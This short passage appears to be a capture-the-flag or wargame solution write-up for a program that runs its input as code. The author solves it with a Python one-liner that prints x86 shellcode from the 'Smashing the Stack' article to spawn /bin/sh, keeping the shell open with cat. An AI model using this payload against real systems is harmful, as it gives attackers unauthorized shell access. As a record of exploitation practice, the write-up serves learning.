On seeing the code, I saw that whatever is given as the input is executed directly.
So i just needed to supply it with a shell code.

I used the following shell code mentioned in : http://insecure.org/stf/smashstack.html

(python -c "print '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'";cat)
